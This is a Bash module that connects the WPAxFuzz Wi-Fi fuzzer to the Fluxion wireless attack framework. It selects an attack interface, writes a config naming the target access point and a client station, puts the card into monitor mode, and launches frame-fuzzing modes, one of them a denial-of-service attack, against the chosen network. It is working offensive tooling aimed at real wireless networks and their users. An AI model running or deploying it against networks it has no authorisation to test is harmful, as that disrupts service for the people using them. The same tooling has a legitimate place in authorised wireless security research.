#!/usr/bin/env bash

# ============================================================ #
# ================ < WPAxFuzz Attack Module > ================ #
# ============================================================ #
# Integration of WPAxFuzz Wi-Fi fuzzer with Fluxion
# Leverages Fluxion's interface selection and target scanning

WPAxFuzzState="Not Ready"

# Path to WPAxFuzz
readonly WPAxFuzzPath="$FLUXIONPath/WPAxFuzz"
readonly WPAxFuzzConfigPath="$WPAxFuzzPath/src/config.json"

# ============================================================ #
# ================ < WPAxFuzz Header > ======================= #
# ============================================================ #
wpaxfuzz_header() {
  fluxion_header
  fluxion_target_show
  echo
}

# ============================================================ #
# ================ < WPAxFuzz Subroutines > ================== #
# ============================================================ #

wpaxfuzz_check_dependencies() {
  # Check if WPAxFuzz directory exists
  if [ ! -d "$WPAxFuzzPath" ]; then
    echo -e "${CRed}WPAxFuzz not found at $WPAxFuzzPath${CClr}"
    echo -e "${CYel}Please clone WPAxFuzz into the fluxion directory:${CClr}"
    echo "  cd $FLUXIONPath && git clone https://github.com/efchatz/WPAxFuzz.git"
    sleep 3
    return 1
  fi

  # Check for Python3
  if ! command -v python3 &> /dev/null; then
    echo -e "${CRed}Python3 is required but not installed${CClr}"
    sleep 2
    return 1
  fi

  # Check for scapy (silently install if missing)
  if ! python3 -c "import scapy" &> /dev/null 2>&1; then
    echo -e "${CYel}Installing scapy...${CClr}"
    pip3 install scapy &> /dev/null
  fi

  return 0
}

# ============================================================ #
# =============== < Interface Set/Unset > ==================== #
# ============================================================ #

wpaxfuzz_unset_attack_interface() {
  WPAxFuzzAttackInterfaceOriginal=""
  if [ ! "$WPAxFuzzAttackInterface" ]; then return 1; fi
  WPAxFuzzAttackInterface=""
}

wpaxfuzz_set_attack_interface() {
  if [ "$WPAxFuzzAttackInterface" ]; then return 0; fi

  if [ ! "$WPAxFuzzAttackInterfaceOriginal" ]; then
    if ! fluxion_get_interface attack_targetting_interfaces \
      "$WPAxFuzzAttackInterfaceQuery"; then
      return 1
    fi
    WPAxFuzzAttackInterfaceOriginal=$FluxionInterfaceSelected
  fi

  local selectedInterface=$WPAxFuzzAttackInterfaceOriginal

  if ! fluxion_allocate_interface $selectedInterface; then
    return 2
  fi

  WPAxFuzzAttackInterface=${FluxionInterfaces[$selectedInterface]}
  return 0
}

# ============================================================ #
# =============== < Fuzz Mode Selection > ==================== #
# ============================================================ #

wpaxfuzz_unset_fuzz_mode() {
  WPAxFuzzModeArg=""
  WPAxFuzzMode=""
}

wpaxfuzz_set_fuzz_mode() {
  if [ "$WPAxFuzzModeArg" ]; then return 0; fi

  wpaxfuzz_header

  local choices=(
    "$WPAxFuzzModeManagement"
    "$WPAxFuzzModeSAE"
    "$WPAxFuzzModeControl"
    "$WPAxFuzzModeData"
    "$WPAxFuzzModeDoS"
    "$FLUXIONGeneralBackOption"
  )

  io_query_choice "$WPAxFuzzSelectModeQuery" choices[@]

  case "$IOQueryChoice" in
    "$WPAxFuzzModeManagement") WPAxFuzzModeArg="1";;
    "$WPAxFuzzModeSAE") WPAxFuzzModeArg="2";;
    "$WPAxFuzzModeControl") WPAxFuzzModeArg="3";;
    "$WPAxFuzzModeData") WPAxFuzzModeArg="4";;
    "$WPAxFuzzModeDoS") WPAxFuzzModeArg="5";;
    "$FLUXIONGeneralBackOption") return 1;;
  esac

  WPAxFuzzMode=$IOQueryChoice
  return 0
}

# ============================================================ #
# ============= < Standard/Random Selection > ================ #
# ============================================================ #

wpaxfuzz_unset_mode_type() {
  WPAxFuzzStdRandom=""
}

wpaxfuzz_set_mode_type() {
  # Only needed for modes 1, 3, 4
  if [ "$WPAxFuzzModeArg" != "1" ] && [ "$WPAxFuzzModeArg" != "3" ] && [ "$WPAxFuzzModeArg" != "4" ]; then
    WPAxFuzzStdRandom="standard"
    return 0
  fi

  if [ "$WPAxFuzzStdRandom" ]; then return 0; fi

  wpaxfuzz_header

  local choices=(
    "$WPAxFuzzModeStandard"
    "$WPAxFuzzModeRandom"
    "$FLUXIONGeneralBackOption"
  )

  io_query_choice "$WPAxFuzzSelectTypeQuery" choices[@]

  case "$IOQueryChoice" in
    "$WPAxFuzzModeStandard") WPAxFuzzStdRandom="standard";;
    "$WPAxFuzzModeRandom") WPAxFuzzStdRandom="random";;
    "$FLUXIONGeneralBackOption") return 1;;
  esac

  return 0
}

# ============================================================ #
# ============= < Config Generation > ======================== #
# ============================================================ #

wpaxfuzz_generate_config() {
  local targetMAC="${FluxionTargetMAC:-}"
  local targetSSID="${FluxionTargetSSID:-}"
  local targetChannel="${FluxionTargetChannel:-1}"
  local attackInterface="${WPAxFuzzAttackInterface:-wlan0}"

  # Get a connected client MAC if available
  local targetSTA="FF:FF:FF:FF:FF:FF"
  if [ -f "$FLUXIONWorkspacePath/clients.txt" ]; then
    local foundSTA=$(head -1 "$FLUXIONWorkspacePath/clients.txt" 2>/dev/null | cut -d',' -f1)
    if [ -n "$foundSTA" ]; then
      targetSTA="$foundSTA"
    fi
  fi

  mkdir -p "$WPAxFuzzPath/src"
  cat > "$WPAxFuzzConfigPath" << EOF
{
   "AP_info":{
      "AP_MAC_ADDRESS":"$targetMAC",
      "AP_SSID":"$targetSSID",
      "AP_CHANNEL":$targetChannel,
      "AP_MAC_DIFFERENT_FREQUENCY":"",
      "CHANNEL_DIFFERENT_FREQUENCY":36,
      "PASSWORD":""
   },
   "STA_info":{
      "TARGETED_STA_MAC_ADDRESS":"$targetSTA"
   },
   "ATT_interface_info":{
      "ATTACKING_INTERFACE":"$attackInterface",
      "MONITORING_INTERFACE":"$attackInterface"
   }
}
EOF
}

# ============================================================ #
# =============== < Run WPAxFuzz > =========================== #
# ============================================================ #

wpaxfuzz_run_daemon() {
  local parentPID=$1

  # Put interface in monitor mode
  airmon-ng start "$WPAxFuzzAttackInterface" &> /dev/null

  # Determine the monitor interface name
  local monInterface="${WPAxFuzzAttackInterface}mon"
  if ! iwconfig "$monInterface" &>/dev/null 2>&1; then
    monInterface="$WPAxFuzzAttackInterface"
  fi

  # Set channel
  iwconfig "$monInterface" channel "$FluxionTargetChannel" 2>/dev/null

  # Update config with monitor interface
  sed -i "s/\"ATTACKING_INTERFACE\":\"[^\"]*\"/\"ATTACKING_INTERFACE\":\"$monInterface\"/" "$WPAxFuzzConfigPath"
  sed -i "s/\"MONITORING_INTERFACE\":\"[^\"]*\"/\"MONITORING_INTERFACE\":\"$monInterface\"/" "$WPAxFuzzConfigPath"

  # Create a startup script that shows config info then runs WPAxFuzz interactively
  local startupScript="$FLUXIONWorkspacePath/wpaxfuzz_start.sh"
  cat > "$startupScript" << STARTEOF
#!/bin/bash
cd '$WPAxFuzzPath'
echo ""
echo "=============================================="
echo "  WPAxFuzz Configuration (from Fluxion)"
echo "=============================================="
echo "  Target AP:    $FluxionTargetSSID"
echo "  Target MAC:   $FluxionTargetMAC"
echo "  Channel:      $FluxionTargetChannel"
echo "  Interface:    $monInterface"
echo "=============================================="
echo ""
echo "Config file has been auto-generated."
echo "Select your fuzzing mode from the menu below."
echo ""
echo "Press Enter to continue..."
read
python3 fuzz.py
echo ""
echo "WPAxFuzz finished. Press Enter to close..."
read
STARTEOF
  chmod +x "$startupScript"

  # Run WPAxFuzz in xterm interactively
  xterm -hold -title "WPAxFuzz - Wi-Fi Fuzzer" \
    -bg "#000000" -fg "#00FF00" \
    -geometry 100x40 \
    -e "$startupScript" &
  WPAxFuzzXtermPID=$!

  # Wait for xterm to close
  wait $WPAxFuzzXtermPID 2>/dev/null

  # Cleanup
  airmon-ng stop "$monInterface" &> /dev/null 2>&1
}

# ============================================================ #
# ===================== < Fluxion Hooks > ==================== #
# ============================================================ #

attack_targetting_interfaces() {
  interface_list_wireless
  local interface
  for interface in "${InterfaceListWireless[@]}"; do
    echo "$interface"
  done
}

attack_tracking_interfaces() {
  interface_list_wireless
  local interface
  for interface in "${InterfaceListWireless[@]}"; do
    echo "$interface"
  done
  echo ""  # Enable skip option
}

unprep_attack() {
  WPAxFuzzState="Not Ready"

  wpaxfuzz_unset_mode_type
  wpaxfuzz_unset_fuzz_mode
  wpaxfuzz_unset_attack_interface
}

prep_attack() {
  # Check dependencies first
  if ! wpaxfuzz_check_dependencies; then
    return 1
  fi

  IOUtilsHeader="wpaxfuzz_header"

  # Only need to select the interface - WPAxFuzz handles mode selection
  local sequence=(
    "set_attack_interface"
  )

  if ! fluxion_do_sequence wpaxfuzz sequence[@]; then
    return 1
  fi

  WPAxFuzzState="Ready"
  return 0
}

start_attack() {
  if [ "$WPAxFuzzState" = "Running" ]; then return 0; fi
  if [ "$WPAxFuzzState" != "Ready" ]; then return 1; fi

  WPAxFuzzState="Running"

  # Generate config
  wpaxfuzz_generate_config

  # Run in background daemon
  wpaxfuzz_run_daemon $$ &> /dev/null &
  WPAxFuzzDaemonPID=$!
}

stop_attack() {
  if [ "$WPAxFuzzDaemonPID" ]; then
    kill $WPAxFuzzDaemonPID &> /dev/null 2>&1
    WPAxFuzzDaemonPID=""
  fi

  if [ "$WPAxFuzzXtermPID" ]; then
    kill $WPAxFuzzXtermPID &> /dev/null 2>&1
    WPAxFuzzXtermPID=""
  fi

  # Restore interface
  airmon-ng stop "${WPAxFuzzAttackInterface}mon" &> /dev/null 2>&1

  WPAxFuzzState="Stopped"
}

# ============================================================ #
# ================= < Language Strings > ===================== #
# ============================================================ #
# These will be overwritten by language files but provide defaults

WPAxFuzzAttackInterfaceQuery="Select interface for WPAxFuzz"
WPAxFuzzSelectModeQuery="Select WPAxFuzz operation mode"
WPAxFuzzSelectTypeQuery="Select fuzzing type"

WPAxFuzzModeManagement="Fuzz Management Frames"
WPAxFuzzModeSAE="Fuzz SAE Exchange (WPA3)"
WPAxFuzzModeControl="Fuzz Control Frames"
WPAxFuzzModeData="Fuzz Data Frames (BETA)"
WPAxFuzzModeDoS="DoS Attack Module"

WPAxFuzzModeStandard="Standard (valid frame sizes)"
WPAxFuzzModeRandom="Random (random frame sizes)"

# FLUXSCRIPT END
